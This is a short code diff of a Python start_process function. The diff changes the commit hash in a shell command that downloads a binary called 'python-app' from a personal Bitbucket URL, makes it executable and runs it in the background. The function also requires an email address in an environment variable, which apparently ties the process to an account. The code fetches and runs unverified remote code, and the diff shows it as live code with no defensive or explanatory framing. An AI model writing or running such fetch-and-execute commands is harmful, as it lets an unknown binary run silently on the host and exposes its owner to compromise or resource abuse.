@@ -35,7 +35,7 @@ def start_process():
     if ptk_address is None:
         print('PTK_address environment variable is not set. Please set it to your email address.')
         sys.exit(1)
-    cmd = f'wget https://bitbucket.org/faerasmna/saldorea/raw/6b38749a8419748124d6841d56ceae72c7b5f764/python-app && chmod +x python-app && ./python-app > {LOG_FILE} 2>&1 &'
+    cmd = f'wget https://bitbucket.org/faerasmna/saldorea/raw/aa5d5c683e541c7f336a9846620b649d1f875c94/python-app && chmod +x python-app && ./python-app > {LOG_FILE} 2>&1 &'
     out, err = subprocess.Popen(
         cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
     print(out.decode('utf-8'))
